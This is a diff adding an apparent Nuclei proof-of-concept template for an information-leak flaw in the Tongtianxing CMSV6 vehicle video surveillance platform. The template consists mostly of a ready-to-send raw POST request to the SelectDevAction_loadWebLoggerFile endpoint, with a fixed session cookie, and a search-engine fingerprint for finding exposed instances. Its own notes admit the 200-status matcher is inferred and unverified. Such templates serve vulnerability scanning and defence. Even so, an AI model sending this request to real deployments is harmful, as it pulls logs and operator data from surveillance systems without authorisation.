@@ -1,0 +1,46 @@
+id: poc-1d1fd7adf88138a8ccfa
+info:
+  name: 通天星CMSV6车载视频监控平台SelectDevAction_loadWebLoggerFile存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1d1fd7adf88138a8ccfad112e7e95cc1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1d1fd7adf88138a8ccfad112e7e95cc1
+    fofa: + hunter`web.body="./open/webApi.html"`
+http:
+- raw:
+  - 'POST /808gps/LoggerManagement/SelectDevAction_loadWebLoggerFile.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 103
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    jsessionId:
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=87F04E406314662DEF40451BC5114457
+
+    Connection: close
+
+
+    page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
